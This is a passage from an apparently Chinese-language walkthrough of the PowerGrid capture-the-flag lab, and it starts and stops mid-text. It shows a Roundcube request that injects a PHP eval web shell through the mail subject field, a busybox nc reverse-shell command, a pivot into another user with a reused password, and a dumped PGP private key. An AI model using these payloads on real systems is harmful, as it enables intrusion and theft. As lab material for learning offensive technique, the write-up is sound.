launching our hack.</span><br><span class="line"></span><br><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line"></span><br><span class="line">hQIMA1WQQb/tVNOiARAAub7X4CF6QEiz1OgByDAO4xKwLCM2OqkrEVb09Ay2TVVr</span><br><span class="line">2YY2Vc3CjioPmIp1jqNn/LVLm1Tbuuqi/0C0fbjUTIs2kOWqSQVVpinvLPgD4K+J</span><br><span class="line">OykGxnN04bt9IrJddlkw3ZyZUjCBG46z+AS1h+IDCRezGz6Xq9lipFZwybSmL89J</span><br><span class="line">pijIYF9JAl5PeSQK9kTHOkAXIsLUPvg8fsfa9UqGTZfxS6VhlNmsoFDf4mU6lSMl</span><br><span class="line">k4VC2HDJwXoD+dEdV5dX1vMLQ5CKETR1NjaWV/D++YTaZMO+wj5/qekfhqDXh0Yo</span><br><span class="line">4KhqKKlAbk/XhPuRmuj/FnS/8zwlYH9wPYuacBPXLwCIzaQzkn5I+7rVeeMqoT82</span><br><span class="line">c2F7ASQy79COk9eU900ToCyjjXQwnlBaQ51QOZjnQgcEnKVmrbURgzpQUVzdy8Oy</span><br><span class="line">XvysJt3OBIJ9zT1l7fq5slmCjVAq8G2nlhdNv1K27+79eVPzrJ3pqg+MlssXRb3T</span><br><span class="line">PQ3hPgKR7U/YgU6O9YorAoJmgxD2CsmGrmK66jwbTKBONTxcfUg+gu1z8Ad4gleL</span><br><span class="line">+Gbk4qMuLVFGzEBdeJYzRD7m6F3Ow/evwjzMr5fDdSOUSATOKuki0dOx14OTFNzP</span><br><span class="line">CJbDZzquZ294lvFviYMSNQy7cWNN86gVQWyWUW0f+Ui3UONTIr9e0gLez/OJUwzS</span><br><span class="line">6wHHu7TA3lgwvc/iMjpuPLnGo046T8J0IqXZHOIn0LJXP36I0l4vTAGtKpZuGNS+</span><br><span class="line">zT/R1y6eIBd5CInFwLXbkbhOomwEfbHQci0zKHzjpEnx8a18zbuNLB4dclN3nyni</span><br><span class="line">Fnh2S0YYPEoJXWKA6ToNuQF/GZyI8QKELyc4ZhkHiKmdN6Q9z659JWQOnM/MW+tB</span><br><span class="line">sjxwjesbAO+hjc19ok0VUsiMVj8TnUuB1Ifgf4ItnDzP8Myc59/FaS46eVy7Y7M1</span><br><span class="line">sICrc62wVLkglG2zjIvTF3CYPYrJDB6+BXOGJv7vpPdcbpaVwc1KYjZW9JMfVLIz</span><br><span class="line">NGY1zaz5nY9sZw/Q5rmYyUAzHnMjuOkRNjRuSjEHHZEG/gLLco6GCeBQzZqvyiXM</span><br><span class="line">auuvO37nFduss3U+7sLd4K3IabgZZHaEu4QEDiuZc40WVSZOIhv5srcLnky2GSPe</span><br><span class="line">a0xjQxSvMNKroyx2IoKLNkUq1fDGbGD/Wu4erOz/TO0/SqnAJK9Mqh6CjUhAZwxE</span><br><span class="line">m+ALMtyYd3wyUcclqG1ruprGKKMB0KRNxAtIL+RXmUvqhoPAazqZ/X6QW+mekt6f</span><br><span class="line">/sBuDEXD++UPqYi24kO0E1UB8bdRNP+sVxdFMoImahcqRog1tPp09aVcLcEtQBIP</span><br><span class="line">7CZ/kUsQmEe5yPbK5W/0xSo8+B4OranG9eHvjQlu/pS6GCsyT8NzEiZYMVQ5qs/A</span><br><span class="line">04Rm5H5V7W+elw9svPBSjDj6XBhUvUekJ9jU7es018k2fZ8gid1kFurNZ7xOLyTL</span><br><span class="line">ebzLqsOszwIhGYEpYnt2m9R0M7eoEq4pmwfra5oaaNrDhKFAp6DddERMNmembr42</span><br><span class="line">cLH1xBWuE2AVqFwbeEUYjVt+Sy1OauuAGkMy9KxXSzR//1wQ0hojooz6XsY/a3c1</span><br><span class="line">huvrG4CzMT8cPbNDMSvOGca0l+QpmQ7qg14sYZuJcqARue07DgpQIsOXeUspFooO</span><br><span class="line">lOUsNrJwJcpWJViKuJ9XuwcprBowdz6Y6WmeY57R13ivoHy+j+2s2Sefq6rjMzEw</span><br><span class="line">HtatDtk9BA4gBFREqSldmepAnvE3GiJJEYHwC7sQCoqNB15/ftTM9LtbMRe05FXm</span><br><span class="line">9mLcD2aSP5BIy9jrCBJqPjdsnxupqeBxMx9do79iCXIXms6VbNpnBeKMZFrnFx+Z</span><br><span class="line">LMd13s2pWA0CApb3JATcGa4adKs2k4L08oSr+revlX3fUvey090VSji+Kebi7gJ/</span><br><span class="line">l08BWpMZbLbf9J6zgbLbWfl8OQbYLl94A8lTDK5m7JKLSSL/B16jx2LWPIGSszLS</span><br><span class="line">NxlWCk0ae5Lf75Bbux12xkDukXsODd+hkksNQ4M/E8wgBoRmrL9P/CUX4YvrVT9u</span><br><span class="line">qK98rhQPeIJMYwYiZVb4K7L18EyKK6S+jn5LwwUxzpkRRNZ8mg+lbtiSwTDtG8IK</span><br><span class="line">l6+3kTIPcECGPbghf0GFH7PnQY8f0MO9IbYsy2pcoagGtizUecyraxPF9qPwoBV3</span><br><span class="line">4QBz+/KLKUpqwLUoKc5PLn7RAJcXZiY8QkSBW6jbieoblylDOIuDjpd3IYqCqjW8</span><br><span class="line">WOI/XS4zi5R3mozMosLrohm27iDsuFNnEIiWFITYTrHuNRk1xW4YoZPiW22mp7qE</span><br><span class="line">xnhp7GpepiD8RoRjj0AJThSa2Mlva/bfHwm98Fk8j4R60stBqkK/+/7htpnwzQhF</span><br><span class="line">e2w7UZwh+EmwNGPyfeWn/4OAS8evTQc2svc/qHXvrHRid/6yDQt4ZCsJmsLDUEkj</span><br><span class="line">1KG++hRMC7TYPXP/LovWxm8JgKwI0T+szYMXDSVOdGEM/168y7UMA/v28NJ7emzf</span><br><span class="line">cC8JWBH4u4XntgwzEsc02BaY1E0NJ86/JuOX4ajYxDWlXR+jJmmLWtbbI5mWW9mr</span><br><span class="line">KaMzgdXQYQmmfMWJ/BLvb95FTg7R0QemsT1mk2jOfalaHz4670qRKhI48rb0+c6Y</span><br><span class="line">COYINTgYLtO1BtKkOR9Y7MMcvmCD+GecL29gCvL+t+/VDLkvwvWErX4jTbjuLwJX</span><br><span class="line">yGJKa7imlr4k72ZjhKJPivmdv4K8XtQKpBqtfop1Bma0EoFyQvIuuQpA9oP3qghl</span><br><span class="line">MMFCF4PVpmSI0clZxJYcJX1VI6bkfc0hp4uj3Pu5+G6OJHPOsgoSdFwkX1dBFp2I</span><br><span class="line">Yir6n929kn+OyX/T5hrBIiSs+1rujRC/AeV7+/BDVfoTk7Ti0MHnQ89K2L0xqayh</span><br><span class="line">aw5mnpDFcOdBWBr5f5fBc2KxO8UK2Dyj5cTL05wvC8vzi81Zy8WzwEMnDAQ3hqTp</span><br><span class="line">qymGZOhD1X0cpxRO3MTMHf7W3AJNmOqhU87teqDJQXmAeZ3Cy1zIIh3Y8Jem3A5y</span><br><span class="line">7+dUSAJacrdfqf8CNsGLT7iiyGCHOQH8Pig/9yCP1lerGBMN3rXeqBqoxSSYGa5Q</span><br><span class="line">OUzqgcvBwO6Enn4f9LPvKeMywhMgJU4MFtvSumulFYeoLJnzpDsXimFzXlKncKai</span><br><span class="line">nzgqHgyZahwCo41DOvIdY5qSrkspUexqF80wy/C870rnvMIea9iiUT2+gSmM27zZ</span><br><span class="line">0xKQ0pMZygMJ1/tGNAGdByvjcP3eZR9tclu4/nBiNQV3EcZzrp/GQ26lukzgHIp/</span><br><span class="line">3w4U4DRtKleemh+ibKzHwnKiB766Z/DC2KBVtxK6AM4TiJ+0COfBiGTpi1hwNxfS</span><br><span class="line">yI26D5VncheNkiOH9UEg7Smi5n104L7lFq8Z4w3uNR9IgMZSEbOKpPP5gvd8DlZC</span><br><span class="line">QUJzYkPHWdQPBIVgqiboTw7UmKFxF3tne9lnZEmPgD5z6VUP5H3cixPCqBIMtM3s</span><br><span class="line">WdaACLBSW8hebDTuJOHikONjUKcy+3pdLN/70CQ4uk7Zt+VVTL0bsYpmMqqBabU4</span><br><span class="line">+xLXl2QiSLawg68DlE2aM/1DW219LfEiXO1AwGIAByP+j/g6tI3qujXT1UrimKHu</span><br><span class="line">iIo9m9k/hQGPfm4jeNL3mgScuhOof4Xqh8QMpGMCXUQZUGvgzJa9gq4j/pe/8KK7</span><br><span class="line">yYmpZGblM7y9ForPlM3dcZMGCnUtfjUf8p5f2HvWMWBZVMWe0EjI/5NqCLqrfBSx</span><br><span class="line">0YzDg1eCiNCWS53OA2HeAu97QdVXWk0vCeq+KUmTNt9/mRqALpEUZ0REae7v5OhL</span><br><span class="line">5YRfmnYwj+3zyvF4m/iC2rWKyQKREXN5vRaCWmTDpy54cU0sotpOLxTfnW6Ab/KR</span><br><span class="line">y88xv7Si7n8yyBtWfBf6wTSXa7oo8f0KPxycNOiFAUJD9oGtL0ICpPeaZnW+2pCr</span><br><span class="line">EWQat6BOsAjJIZALUVfOgJn8QyV6spySr5W91dp4dZ05v544ysT/zHJG29+iLmq6</span><br><span class="line">7b7CiONwnj48KQhq7FF8iEu/Hi2qcoH9MCmog7i3QPGQXEq+6M1mtXAqXY43Qxmu</span><br><span class="line">2m1PP5YLf47r4/cVccg721ag9ffLdL6kUkj9eHPAU/MqI3JX29HF9XTwSu07Vo32</span><br><span class="line">Ym6niojCCeMsf9DuvR92UtOAwMjUrDiQQOM0eL2P7Z21IB6Zb+I7Iqws03zQ5nkD</span><br><span class="line">TYVQnJbdsqsz7Egj+y/gh9Omg/iBxqP2qZ7uEAiQg4P/EEHPMBChe2+SRtYO139v</span><br><span class="line">ChZA53z11q0DzTtmbhoHqIDQ97J9yrdQe6YHvW+zKQMcoEiiOaaJkF6pzmLBGQt2</span><br><span class="line">EH9IQnxd39jtzzLsKWPFUe3G30ELm5TtnMd9WBQVtKNHxlCtD1eB3bTJgC6iHcOA</span><br><span class="line">JowxDggqVtdxKQQEjLGquUkoS7Al5iMnuiA+AXFC5VMmnoPD9v/M3CZaM7qt6LOg</span><br><span class="line">K5usFSp0gwjGvPQO1UJucrKyXSBlOxFbzOxcKClRGqHU4+Ir8Iu8MH1dlTmYH1Qr</span><br><span class="line">UOdasHinj5UODyJyS7rHrzDr9kBKC7AAnCt0WHX7K3jVJEg0TnGpLFFIic7XrMld</span><br><span class="line">6SXxrg0VWv1nqyKqaRXANGFqslktVGktJURntzj/kZD/9sO4Y6qoHMDNC3Aib3m9</span><br><span class="line">RO1va5L9lriZ1vmP37FxIwsrCVVcNrPJxWydvw==</span><br><span class="line">=fPY9</span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>
+
+
+
+<p>试试看在后台能否使用我们前面找到的40892，英语看不懂，丢给AI指导我们一下</p>
+<p>通过AI的指导，按照操作上传恶意文件弹shell即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /zmail/?_task=mail&amp;_unlock=loading1769756526715&amp;_lang=en_US&amp;_framed=1 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.56.107</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 338</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.56.107</span><br><span class="line"></span><br><span class="line">Authorization: Basic cDQ4OmVsZWN0cmljbw==</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.56.107/zmail/?_task=mail&amp;_action=compose&amp;_id=2141640547697c4b362cda2</span><br><span class="line"></span><br><span class="line">Cookie: language=en_US; roundcube_sessid=e98b2nf21nfe1mv1jurvdi26og; roundcube_sessauth=HsDhhJGuhfToyomCEkcsqEwJQW-1769756400</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Priority: u=4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_token=O3qMBUNQftd60tJgMYEwr305zvJ8vrPZ&amp;_task=mail&amp;_action=send&amp;_id=2141640547697c4b362cda2&amp;_attachments=&amp;_from=1&amp;_to=exp%40exp.com&amp;_cc=&amp;_bcc=&amp;_replyto=&amp;_followupto=&amp;_subject=%3C%3Fphp+<span class="built_in">eval</span>%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&amp;editorSelector=plain&amp;_priority=0&amp;_store_target=Sent&amp;_draft_saveid=1&amp;_draft=&amp;_is_html=0&amp;_framed=1&amp;_message=aaaa</span><br></pre></td></tr></table></figure>
+
+<p>然后访问GET请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.107/abc.php?cmd=busybox%20nc%20192.168.56.102%207777%20-e%20sh</span><br></pre></td></tr></table></figure>
+
+<p>成功弹回shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nc -lnvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 51582</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>升级一下shell之后进行下一步的操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@powergrid:/var/www/html$ <span class="built_in">id</span>    </span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@powergrid:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">abc.php  images  index.php  startTime.txt  style.css  zmail</span><br><span class="line">www-data@powergrid:/var/www/html$ <span class="built_in">ls</span> -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  4 www-data www-data 4096 Jan 30 07:07 .</span><br><span class="line">drwxr-xr-x  3 root     root     4096 May 20  2020 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data  580 Jan 30 07:07 abc.php</span><br><span class="line">drwxr-xr-x  2 www-data www-data 4096 May 19  2020 images</span><br><span class="line">-rw-r--r--  1 www-data www-data 4308 May 20  2020 index.php</span><br><span class="line">-rw-r--r--  1 root     root       19 Jan 30 06:55 startTime.txt</span><br><span class="line">-rw-r--r--  1 www-data www-data 1382 May 19  2020 style.css</span><br><span class="line">drwxr-xr-x 12 www-data www-data 4096 May 19  2020 zmail</span><br><span class="line">www-data@powergrid:/var/www/html$ <span class="built_in">cd</span> ..</span><br><span class="line">www-data@powergrid:/var/www$ <span class="built_in">ls</span></span><br><span class="line">flag1.txt  html</span><br><span class="line">www-data@powergrid:/var/www$ <span class="built_in">cat</span> flag1.txt</span><br><span class="line">fbd5cd83c33d2022ce012d1a306c27ae</span><br><span class="line"></span><br><span class="line">Well <span class="keyword">done</span> getting flag 1. Are you any good at pivoting?</span><br></pre></td></tr></table></figure>
+
+<p>用前面的密码横向到p48用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@powergrid:/home$ su - p48</span><br><span class="line">Password: </span><br><span class="line">p48@powergrid:~$ <span class="built_in">id</span> </span><br><span class="line">uid=1001(p48) gid=1001(p48) <span class="built_in">groups</span>=1001(p48)</span><br></pre></td></tr></table></figure>
+
+<p>发现了这个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">p48@powergrid:~$ <span class="built_in">cat</span> privkey.gpg</span><br><span class="line">-----BEGIN PGP PRIVATE KEY BLOCK-----</span><br><span class="line"></span><br><span class="line">lQdGBF7EMI8BEACkkD/7Trad64+JxRNQSrFt1fuOk/nmTO+jvzOjaL9krMgPMH+M</span><br><span class="line">74t8StzUN0dySOXZcPvYFuZcdbX7Tbpns4ib/w5KDoWxGlGzKQf9NDwn9aMaWErp</span><br><span class="line">ZZhLgehNSee79oUUC/s86e7896lmFDM9uVvcEucSrlPF1KRYsDDIETjfpAHtSZI5</span><br><span class="line">0zWKBod6VegIw0S3tnYqxOb3x3Sq0DcyTUjxaVkI3E3WOsHqQKl9gUVh/uKfHIMI</span><br><span class="line">A7EcDJcyv8p00FK5CMxVFLmMRBrKqpSTVF8WOK1LMjN5w+OZbq4Lnmi3CgAcCKlG</span><br><span class="line">r1EqRZUnaldElPJ0+fQZLIc6BAN4KlhUyCL7H/jnw3v2kyS+fOFLDuQWePQJJ+/V</span><br><span class="line">bp/rBp3DFbE22004NIsoiCWqcGoW1Cw1AjM6ZTEE28Oet1AVAJgaBzLlm8258XF6</span><br><span class="line">AW4VygooOH1hyiuy6Kq2XZxbd1u05ScRie+/g4W7PpyQz7FJ1bkDAHPY/Vw2rN9u</span><br><span class="line">iluQrEAvW9yoAMja288CgpmOXIcUkvr4lx6u6+AeHVuaMaKM2qThdlEt+w6YxEM2</span><br><span class="line">oxM+6EyzklRf6BwmDWy+jBCyY42T9/Sge0y+RdzCym05AW6PsuDjNZRmr4HgkE9U</span><br><span class="line">WeYH4poTgwtQeP4PWqdEPWsFitl97v7Lo7KVpgBD4WyvrWfAQ6PYBZ9ddwARAQAB</span><br><span class="line">/gcDAh8v/BgIX/xK9JiBrQ5RLLD4Xtb4ljo+vhrUDYAWChYNx+uPRwFYgEkaeJeg</span><br><span class="line">Zc8ubOvq7PY5YHWIsXENB0GQdb4FWuJVGWCPXZCKS0bNeFCLfu527R4Rj0lp359I</span><br><span class="line">dS0KTRkVneR5S+g5X1tf6WWJWcpY7ONOGZhxUKJiM2ceBA6yzLeBbVDHrFgQooIk</span><br><span class="line">NPmiI6lIJ2R8OieQw8nnHyx3fL6IvmnLOFL0l8mVlMHe2krfcoW1CTc52Cw759N2</span><br><span class="line">t6O00M8neNjAmd2DMfM1x+Vr/NeF9R+L9vvCaDnUQAsVpxeU8cNmtEOfPcF4dSFb</span><br><span class="line">c5sBA33I656TAyhpc3kthuF7QKHVx/L06utGO0h/0LLZC57EOQYBphn1o3kLsVVI</span><br><span class="line">tNMdZ8jMRVuzpLGLnQiLu99+wkagW1Uxc7zEnOV38R7ILbSYUWRR3YXh1hSRTEYU</span><br><span class="line">i4xrf3CCiXm1KTbboXcJGKdvKpCc2wfQV4hgPLmxqFcQJPWWSVXPw0nmflxGtD1O</span><br><span class="line">tgHpMX98c6RozHWupof9Kbe6Y0Ur0w2lRS9Bg95bUprBVgI7fOAcCfuqhAmvMiZA</span><br><span class="line">m8loDcK8twUDuBBG9bBvNf9bN5phfxOJgAP3rAmXY3GAA8j1LBi//IEDqJVr3oZI</span><br><span class="line">AtBamkAaTRS1/IItVlJT+YA5Vu8YTeVFi9gF7WnAxJcJj9kN0lZCjczMw1f5AeVi</span><br><span class="line">ot+2O8gzQ+ODF2N1mqvQrrGzEb/lTgM/V5gIozzz0HUR8CshshaJGKG8Vhy/sODz</span><br><span class="line">WdJmvlWlVSF4p/QwjFhj6D74/czsTuTfX0PCEN0jSUoY8ntXuy+45TbA8GrYI8Cy</span><br><span class="line">yup7/9DWv3t44LyEu5WIRXt124T3e04YuK3/J4zJfwMgzbM2e+S+/2u0aEF0cF4E</span><br><span class="line">sYobYpV28GD6hLTLMvdgs1HZhJ5+SgzXXOpKkCAu6g6voE+4+NyBWmORi2zZlDkT</span><br><span class="line">faYYbHhShRvOsYmhD1xbBVnONYIN1JDDq1oXaHlhwAIFODlTJm3nPbnhqlKcXv40</span><br><span class="line">YLcaZCmfo35/vI122s/GzyCOL3Tehv/X4rfnLkpje3XspdJ3e3rvrmvqsv2L45r9</span><br><span class="line">YG8Lwq+CP98O9UScG7aQTIEhPYVcio+U+5C9wCjB/PfysFuX5QXfvhFEo9QtxQDv</span><br><span class="line">G7fhE/Ku0oLBNzcDX7v2c3Ny+fT77mqhshTuYM03sraRIDibXTRxEtpB3l4CgAfL</span><br><span class="line">HCBuVOsJPa07PvCLgUlf6OPi65URvOI8W+d3X3i0ZqSy4Zq/ZBUK54+KA+JHSppl</span><br><span class="line">TeeiD+Ner3jg3aNC5ftsnuGC53co3Jko0GaQRjM3aTMczW/Tb/TUl4g1PC/PZTxJ</span><br><span class="line">z7XdJ0QTOpVub9HWJ7f8oALairav8KH5leRxjH6oiVnNFRxrczrSP8GY7s7yRRWK</span><br><span class="line">K8hsGtABa7HHlP06gt891IWvmOuom8/GB/xiHuydFGU4Jh6/VyMBJ5CW536/zyRF</span><br><span class="line">ARKEp9VjcK6aqI8WS7UgcvuQuHMPc0mpbR68AEpLSrbWYFVU53brcY+XU1BDaG4K</span><br><span class="line">+xuwPDFlFksNrLba2xCQJuiU7LH4FihbV5JPE0NOj06KhmWjzwit6sOMRj8PjyYx</span><br><span class="line">Pd2nIRZ/JZg9v9qKSr+kdGNYDMWzyIhG/DfFycvgHqe9V+6xBQNFtzFwxRCFgHOD</span><br><span class="line">2lPYgWl2mnZPWN0VmIJ0t/H+NQZF9WIbiEtd0axiRg0zpE6AMKQ3xzD1MWnVKuQu</span><br><span class="line">g35DXTNQYWLIzJNrYsE93/aYmhbpkLh51RVhDq3NGyqNWnUoGT0EKUC0GlA0OCBI</span><br><span class="line">YWNrZXIgPHA0OEBwb3dlcmdyaWQ+iQJOBBMBCgA4FiEEdiNMQ+hO/JKQTKyMc9GY</span><br><span class="line">IOKRmb0FAl7EMI8CGwMFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQc9GYIOKR</span><br><span class="line">mb2f+g//Vt1PcacNppdlf4Mgrf0WfRm8VbW7GKzo6OH51gLNFfJjxOTqf0EBCI9u</span><br><span class="line">UJKcU5P0zzxuifMCt6qO7MadxPwcN3h1W5OWjVR6a/CnexFkLOnWS4xq1UKxQ8IF</span><br><span class="line">qnakMVU+mtU1AffAa5DNzEBOYkEaPOmEX8MBWoGOWuqLILO7IBAEMWnSPpEAUxcr</span><br><span class="line">pO8h3fam5Ev7zcaGEE+PuNLcJCwBOLiUwu0iqkcaB6jtil5yIwvo8qKgE626rj/o</span><br><span class="line">vNzeJqlS1iEAnMXJfIyoH2x8mpKVpWHFrjeIVtG9TtxU5YU2ENzh67spcxiQ2CK4</span><br><span class="line">kRYucjuF7rPp2pOMQ/f6IXPwLGf5oz0w3DHscZMNv3KufYzP6CSuCMNITsfq6gwH</span><br><span class="line">EVG2MJKTDy5b8S8LE3uhxZ/em6dx/xUwwLE/hRxjINF4EeEKmf/P5xQrm6GLTw+o</span><br><span class="line">KQmsOghYEuBOGLyf5QA1+my8b6SWby/Rlapdfne3oKWrpkWqYrJ0VorbDO1S17m1</span><br><span class="line">SjUlF4pb8wGjW5vECPNi4VVA62cOoHE8khT6/tRScG0UTFA86UenqjFKl3k9jnBu</span><br><span class="line">thkqPeuljRCtLlfKMJZ0rep2pEtiXE4PPse7EG/HONfo2gPtQcbkz8ff7Y8+oTo1</span><br><span class="line">heIaub2h7N8CYg2NZsensJGR7j2ML2DU0xFoZCQufhvvgSj1hVmdB0YEXsQwjwEQ</span><br><span class="line">AL5/8C/atcsEqw5jGvxdWjp8uY0+NqFrG8RgzLID5xahMEPYBwEcvH1/amm/8wSd</span><br><span class="line">pdYsi+6mteUzjFbUw9oWmeBZx0SlJYEIyz1UG70nSaxyFJL6PaTMbXRGzQy6K/0+</span><br><span class="line">wA2qRCV2sBFQdyScNsAtDKugWn9oiJxomkIiMWekslV9nAE32GSwYQ87OdQstcc+</span><br><span class="line">h3a5MI9Y0nldOFzmddS+6Q6PtKK3yxBdGI29FtiG6+b6E/Rb2DIEd53p39qZj+rz</span><br><span class="line">jCl8hQr/AxPuNGe66z2ym4VSfXkpmNiotzORTv+3AkXblsFLewbs4drehgJ03NJM</span><br><span class="line">5vtkFSxdiwD2YQ+p9K5Gx+A3sYH+rLvQvHpGMQNsQHUs5cN/2i+Jisz4cJdL+4el</span><br><span class="line">dEJCxltE8hfe+4v6uhjpqHEbP0Axb+r8qp6Nd2zwOR3TqcP3jUm5Jvj1aRsm7y4+</span><br><span class="line">fmaLE0DF2v+qci3UEEAqRp6DD8vMiBTCp2tQGQ8pVDGJbpvYWJ02qLlJnlixn8He</span><br><span class="line">nkyaseMWXrBkXUxigIYNqofe654+XCKlKszLAo9Eouh1nockUNvDpUtkoAR3QmGn</span><br><span class="line">Mtzr/oq7vYTdLSik4ohRpxn247S3WXzSUygCv8lsgZotVjNzifsuEZBM4cdSrl8T</span><br><span class="line">/mPilj5GWDa7Ee1sqPg4gfbcbNrqv0rwj9Br78e/cWEHABEBAAH+BwMCMS36XhI1</span><br><span class="line">B3/0E7g7OQ41Pkpgvo3Kd6i1jcK7CMcoUtQaozqN3msPEJSX4wGw2kO/BgzUbQVa</span><br><span class="line">g80p22096uN/7gbm/Duasmb2TKhQeue6v9hv5A9bY0XPucUwThBh5bAZmDG5NXJK</span><br><span class="line">SCY1y9c0DEFFMKg8NWRICq9wUp7ch2daZpmWYF6j1RiRHrIoB0HG703D37sN6MRs</span><br><span class="line">n3Nv3NHifJ+0rqVlpL3ikNlwAjdcEip3GsPFS0gN8rXl5EBfd26x7gng4rrOH/wi</span><br><span class="line">lGMNNYbSfAjXvW1mt8c+fZcC8Qb7ErVeH2RcbfEcbUihQAkWuciqKoYJBHxJ3k2e</span><br><span class="line">n7pHwdJ+No4VxaasRJ+s45Dr8DboNKnVQVQNRpo4uWP0LhHQsw0ereoRhOkbJp+V</span><br><span class="line">CS/Kw7yAjQvLB0WdU/Ulm1xQ9q1av4E8AukFF1uW90oFt/G4Bfpg1Yj7Ylke0TX1</span><br><span class="line">a92DZooVGGiEhW3thi+DvKd4oGzEPc5Zp1F/Qo6IanHIMmcvmVzgErpKSZ/CwrdY</span><br><span 